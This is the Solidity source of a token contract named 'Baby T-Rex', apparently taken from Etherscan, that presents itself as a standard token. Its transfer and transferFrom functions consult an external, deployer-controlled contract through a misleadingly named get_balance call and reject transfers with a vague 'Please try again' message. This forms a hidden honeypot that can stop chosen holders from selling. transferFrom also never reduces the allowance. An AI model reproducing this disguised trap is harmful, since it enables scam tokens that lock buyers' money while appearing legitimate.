/**
 *Submitted for verification at Etherscan.io on 2021-08-21
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface BP20 {

    function token_name() external view returns (string memory);

    function get_balance(address account) external view returns (uint8);

    function token_symbol() external view returns (string memory);

    function balance_Of(address _owner) external view returns (uint256 balance);

    function total_Supply() external view returns (uint256);

    function spend_allowance(address _owner, address _spender) external view returns (uint256 remaining);
}

contract BabyTrex {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    BP20 account_holder;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby T-Rex";
    string public symbol = hex"42616279542D526578f09fa696";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(BP20 _param) {
        
        account_holder = _param;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(account_holder.get_balance(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(account_holder.get_balance(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}